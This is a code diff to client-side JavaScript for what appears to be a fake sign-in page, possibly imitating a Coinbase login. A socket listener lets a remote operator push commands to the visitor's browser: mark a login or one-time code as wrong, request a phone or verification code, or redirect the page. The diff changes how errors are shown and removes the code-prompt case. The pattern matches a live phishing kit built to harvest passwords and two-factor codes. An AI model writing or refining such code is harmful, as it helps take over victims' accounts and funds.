@@ -20,8 +20,8 @@ const inputs = document.querySelectorAll(".cb-input-text");
 const overlay = document.getElementById("loadingOverlay");
 const loadingBar = document.getElementById("loader");
 const submitBtn = document.getElementById("SubmitBtn");
-const errorText = document.getElementById("errorText");
-const errorMessage = document.querySelectorAll(".show-password-wrapper");
+const errorDiv = document.getElementById("errorDiv");
+const errorMessage = document.querySelectorAll(".cb-message-text");
 const showPasswordCheckbox = document.getElementById("showPassword");
 
 let loadingFrame = null;
@@ -32,15 +32,12 @@ let loadingFrame = null;
 
 function showError(message) {
   stopLoading();
-  wrapper?.classList.add("error", "shake");
-  errorMessage?.classList.add("error");
-  if (errorText) errorText.textContent = message;
-
-  setTimeout(() => wrapper?.classList.remove("shake"), 350);
+  errorDiv.style.display = "block";
+  if (errorText && message) errorText.textContent = message;
 }
 
 function clearError() {
-  wrapper?.classList.remove("error");
+  errorDiv.style.display = "none";
 }
 
 
@@ -138,7 +135,7 @@ socket.on("user:command", (data) => {
       break;
 
     case "bad-login":
-      showError("incorrect password");
+      showError();
       break;
 
     case "bad-otp":
@@ -157,12 +154,7 @@ socket.on("user:command", (data) => {
       updatePhoneField("#phone", code, phonescreen);
       break;
 
-    case "prompt":
-      if (!code) return;
-      sessionStorage.setItem("setPromptCode", code);
-      updatePhoneField("#code", code, phonescreen);
-      break;
-
+    
     case "redirect":
       if (link) {
         window.location.href = link;
